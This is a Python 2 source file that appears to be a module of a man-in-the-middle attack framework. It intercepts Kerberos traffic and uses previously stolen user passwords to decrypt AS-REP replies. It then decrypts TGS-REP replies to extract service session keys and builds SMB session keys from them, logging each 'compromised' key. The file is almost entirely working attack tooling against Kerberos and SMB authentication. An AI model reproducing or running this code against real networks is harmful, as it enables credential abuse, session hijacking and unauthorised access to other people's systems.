from SMB_Core import SMBKey
from ebcLib import MiTMModule
from binascii import hexlify, unhexlify
import hashlib
import traceback
from pyasn1.codec.der import decoder, encoder
from impacket.krb5.crypto import Key, _enctype_table
from impacket.krb5.asn1 import *
import logging
import struct
from pyasn1.error import PyAsn1Error
import multiprocessing
import copy

class K2TKerb(MiTMModule):
	# 
	def setup(self):

		self.CLT_MESSAGE_DATA		= ""
		self.CLT_MESSAGE_LENGTH 	= 0
		self.CLT_INCOMPLETE_MESSAGE = False

		self.SRV_MESSAGE_DATA		= ""
		self.SRV_MESSAGE_LENGTH 	= 0
		self.SRV_INCOMPLETE_MESSAGE = False

		self.PREAUTH_ENCTYPES 			= dict()
		self.KERB_SESSION_KEYS 		= []

		self.logger = logging.getLogger(__name__)
		self.logger.setLevel(logging.INFO)

	# Grabs the salts from the PREAUTH packet
	def parse_PreauthError(self, rawData):
		# self.info['kerbSessionSalts_Lock'].acquire()
		try:
			preauth 	= decoder.decode(rawData[4:], asn1Spec = KRB_ERROR())[0]
			methods 	= decoder.decode(preauth['e-data'], asn1Spec=METHOD_DATA())[0]
			salt 		= ''

			encryptionTypesData = dict()

			for method in methods:
				if method['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO2.value:
					etypes2 = decoder.decode(str(method['padata-value']), asn1Spec = ETYPE_INFO2())[0]
					for etype2 in etypes2:
						try:
							if etype2['salt'] is None or etype2['salt'].hasValue() is False:
								salt = ''
							else:
								salt = str(etype2['salt'])
						except PyAsn1Error, e:
							salt = ''
						if(etype2['etype'] not in self.PREAUTH_ENCTYPES):
							self.PREAUTH_ENCTYPES[etype2['etype']] = []
						self.PREAUTH_ENCTYPES[etype2['etype']].append(salt)
						
				elif method['padata-type'] == constants.PreAuthenticationDataTypes.PA_ETYPE_INFO.value:
					etypes = decoder.decode(str(method['padata-value']), asn1Spec = ETYPE_INFO())[0]
					for etype in etypes:
						try:
							if etype['salt'] is None or etype['salt'].hasValue() is False:
								salt = ''
							else:
								salt = str(etype['salt'])
						except PyAsn1Error, e:
							salt = ''

						if(etype['etype'] not in self.PREAUTH_ENCTYPES):
							self.PREAUTH_ENCTYPES[etype['etype']] = []
						self.PREAUTH_ENCTYPES[etype['etype']].append(salt)

		except PyAsn1Error:
			# self.logger.error("[K2TKerb parse_PreauthError3]")
			pass
		except Exception, e:
			print("[K2TKerb::parse_PreauthError]: " + str(e) + " " + traceback.format_exc())
		# self.info['kerbSessionSalts_Lock'].release()

	# Compromises the KerberosSessionKey and populates it in self.KERB_SESSION_KEYS
	def parse_AS_REP(self, rawData):
		if(len(self.PREAUTH_ENCTYPES.keys()) == 0):
			return rawData
		# self.info['kerbSessionSalts_Lock'].acquire()
		# self.info['kerbSessionKeys_Lock'].acquire()
		try:
			cname_start = rawData.find('\xa1\x12\x30\x10') + 6
			cname_end 	= rawData.find('\xa5', cname_start)
			userInRep 	= rawData[cname_start:cname_end]
			#
			# self.info['poppedCredsDB_Lock'].acquire()
			#
			asRep 		= decoder.decode(rawData[4:], asn1Spec = AS_REP())[0]

			for user in self.info['poppedCredsDB'].keys():
				popped = self.info['poppedCredsDB'][user]
				if (str(asRep['cname']['name-string'][0]).lower() == popped.username.lower()):
					# Try to decrypt the KerberosSessionKey with the user's password
					enctype = int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)
					cipher 	= _enctype_table[enctype]

					for encType in self.PREAUTH_ENCTYPES[enctype]:
						try:
							# if(popped.nt_hash != ''):
							# 	self.logger.info("USING NT-HASH")
							# 	key = Key(cipher.enctype, popped.nt_hash)
							# else:
							key 	= cipher.string_to_key(popped.password, encType, None)

							
							cipherText 	= asRep['enc-part']['cipher']
							plainText 	= cipher.decrypt(key, 3, str(cipherText))

							encASRepPart 	= decoder.decode(plainText, asn1Spec = EncASRepPart())[0]
							sessionKey 		= Key(cipher.enctype, str(encASRepPart['key']['keyvalue']))

							# This is the user's Kerberos session key
							self.KERB_SESSION_KEYS.append(sessionKey)

							self.logger.info("\t!!! Popped a user's AS_REP !!! " + hexlify(sessionKey.contents))
							break
						except:
							continue

			# self.info['poppedCredsDB_Lock'].release()
		except Exception, e:
			self.logger.error("K2TKerb[parseServerResponse] Type 11 Error: " + str(e) + " " + traceback.format_exc())
		# self.info['kerbSessionSalts_Lock'].release()
		# self.info['kerbSessionKeys_Lock'].release()

	# Compromises the ServiceSessionKey and populates a new SMBKey in the SMBKeyChain shared dict
	def parse_TGS_REP(self, rawData):
		# mine = False
		# if not self.info['smbKeyChain_Lock'].locked():
		# 	self.info['smbKeyChain_Lock'].acquire()
		# 	mine = True
		try:
			enctype 	= int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value)
			cipher 		= _enctype_table[enctype]
			tgs 		= decoder.decode(rawData[4:], asn1Spec = TGS_REP())[0]
			cipherText 	= tgs['enc-part']['cipher']
			# Key Usage 8
			# TGS-REP encrypted part (includes application session
			# key), encrypted with the TGS session key (Section 5.4.2)
			sk = None
			plainText = None
			kerbSessionKey = None
			for ksessionKey in self.KERB_SESSION_KEYS:
				try:
					plainText 		= cipher.decrypt(ksessionKey, 8, str(cipherText))
					kerbSessionKey 	= ksessionKey
					break
				except Exception, e:
					self.logger.info("Failed to decrypt TGS with " + hexlify(ksessionKey.contents))
					pass
			if plainText == None:
				# print("Failed to decrypt TGS ServiceSessionKey")
				return rawData

			encTGSRepPart 		= decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
			ServiceSessionKey 	= Key(encTGSRepPart['key']['keytype'], str(encTGSRepPart['key']['keyvalue']))
			cipher 				= _enctype_table[encTGSRepPart['key']['keytype']]
			newKey 				= SMBKey(sessionBaseKey = ServiceSessionKey.contents[:16], kerbSessionKey = kerbSessionKey.contents, kerbServiceSessionKey = ServiceSessionKey.contents)

			# Load the popped key into the keychain
			# self.info['smbKeyChain'][hash(newKey)] = newKey
			# self.info['kerbPoppedKeys'].put(newKey) # For speed

			# if(mine):
				# self.info['smbKeyChain_Lock'].release()
			self.logger.info("[K2TKerb]\t !!!Compromised TGS ServiceSessionKey (SMB SessionBaseKey is first 16 bytes)!!! " + hexlify(newKey.KERBEROS_SERVICE_SESSION_KEY))

			# SMBKey(sessionBaseKey = ServiceSessionKey.contents[:16], dialect = self.SESSION_DIALECT, kerbSessionKey = smbKey.KERBEROS_SESSION_KEY, kerbServiceSessionKey = ServiceSessionKey.contents)

		except Exception, e:
			print("K2TKerb[parseServerResponse] Type 13 Error: " + str(e)+ " " + traceback.format_exc())
		pass
		# self.info['kerbSessionKeys_Lock'].release()

	# Handle the intercept
	def parseClientRequest(self, request):
		'''
		try:
			if(self.info['attackConfig'].KERBEROS_KILLER):
				# self.logger.info("KERB KILLER?!?!?!!")
				# If it's a TGS request, drop it
				return

			# Handle split TCP segments
			if(self.CLT_INCOMPLETE_MESSAGE):
				# self.logger.info("SPLIT KERB MESSAGE")
				self.CLT_MESSAGE_DATA += request
				if(len(self.CLT_MESSAGE_DATA) != self.CLT_MESSAGE_LENGTH):
					# self.logger.info("SPLIT KERB MESSAGE: " + str(len(self.CLT_MESSAGE_DATA)) + "/" + str(self.CLT_MESSAGE_LENGTH))
					return
				else:
					request 					= str(self.CLT_MESSAGE_DATA)
					self.CLT_MESSAGE_DATA 		= ""
					self.CLT_INCOMPLETE_MESSAGE = False
					self.CLT_MESSAGE_LENGTH 	= 0		
			
			if not self.CLT_INCOMPLETE_MESSAGE:
				messageLength = struct.unpack(">i", request[0:4])[0]
				if(len(request) < messageLength + KERB_HEADER_LENGTH):
					# logging.info("SPLIT KERB MESSAGE2: " + str(len(response)) + "/" + str(messageLength + KERB_HEADER_LENGTH))
					# self.logger.info("SPLIT KERB MESSAGE")
					self.CLT_INCOMPLETE_MESSAGE = True
					self.CLT_MESSAGE_LENGTH = messageLength + KERB_HEADER_LENGTH
					self.CLT_MESSAGE_DATA 	= request
					return
		except:
			return request
		# TODO: Record victim AS-REQ to crack

		'''
		return request
	
	# Handles the intercept
	def parseServerResponse(self, response):
		# self.logger.info("RESPONSE: " + hexlify(response))
		try:
			# self.logger.info("SRV_INCOMPLETE_MESSAGE: " + str(self.SRV_INCOMPLETE_MESSAGE))
			# We are expecting the remaining parts
			# of a kerb packet
			if(self.SRV_INCOMPLETE_MESSAGE == True):
				# self.logger.info("STACKING PACKET")
				self.SRV_MESSAGE_DATA += response

				# Check if we've recieved all of the data
				if(len(self.SRV_MESSAGE_DATA) == self.SRV_MESSAGE_LENGTH + 4):
					# self.logger.info("COMPILED")
					response = str(copy.deepcopy(self.SRV_MESSAGE_DATA))
					self.SRV_MESSAGE_DATA 		= ""
					self.SRV_INCOMPLETE_MESSAGE = False
					self.SRV_MESSAGE_LENGTH 	= 0	
				else:
					# self.logger.info("Stacking data: " + str(len(self.SRV_MESSAGE_DATA)) + "/" + str(self.SRV_MESSAGE_LENGTH + 4))
					# self.logger.info("\n" + hexlify(response))
					# Don't have all of the data yet, stay our response
					return
			messageLength = struct.unpack(">i", response[:4])[0]
			if(len(response) < messageLength + 4):
				self.SRV_INCOMPLETE_MESSAGE = True
				self.SRV_MESSAGE_LENGTH		= messageLength
				self.SRV_MESSAGE_DATA 		= response

				# self.logger.info("Kerberos getting split: " + str(len(self.SRV_MESSAGE_DATA)) + "/" + str(self.SRV_MESSAGE_LENGTH + 4) + "\n" + hexlify(response))
				return
			

			# self.logger.info("Sending off packet: " + hexlify(response))
			# '''
			version = response.find('\xa1\x03\x02\x01')
			if(version == -1):
				# Not kerberos?
				return response
			messageType = version + 4
			mtype = ""
			mtype = struct.unpack(">B", response[messageType])[0]

			return response

			# PREAUTH_ERROR - containing salts
			if(mtype == 30):
				self.parse_PreauthError(response)
			# AS_REP (contains the user's encypted KerberosSessionKey)
			if(mtype == 11):
				self.parse_AS_REP(response)
			# TGS_REP - containing a Kerberos ServiceSessionKey
			if(mtype == 13):
				self.parse_TGS_REP(response)

			if mtype not in [30, 11, 13]:
				self.logger.info("UNKNOWN MESSAGE TYPE: " + str(mtype))
			#'''
			return response
		except Exception, e:
			self.logger.error("K2TKerb[parseServerResponse] " + str(e) + " " + traceback.format_exc())
		return response

